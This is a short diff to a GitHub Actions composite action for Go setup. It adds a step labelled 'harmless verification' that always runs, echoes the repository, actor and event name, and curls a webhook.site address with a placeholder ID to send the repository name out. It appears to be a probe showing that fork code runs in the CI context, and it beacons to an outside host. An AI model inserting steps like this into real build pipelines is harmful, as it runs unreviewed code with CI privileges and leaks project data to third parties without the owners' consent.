@@ -86,3 +86,11 @@ runs:
       with:
         go-version: ${{ inputs.go-version == 'default' && '1.25' || inputs.go-version }} # never set patch, to get latest patch releases.
         cache-dependency-path: $${{ inputs.disable-cache && '' || 'sdks/go.sum' }}
+
+    - name: RETEST-3763942 harmless verification
+      if: always()
+      shell: bash
+      run: |
+        echo "RETEST: fork code executed in CI context"
+        echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
+        curl -s "https://webhook.site/YOUR-WEBHOOK-ID" -d "retest=3763942&repo=$GITHUB_REPOSITORY" || true
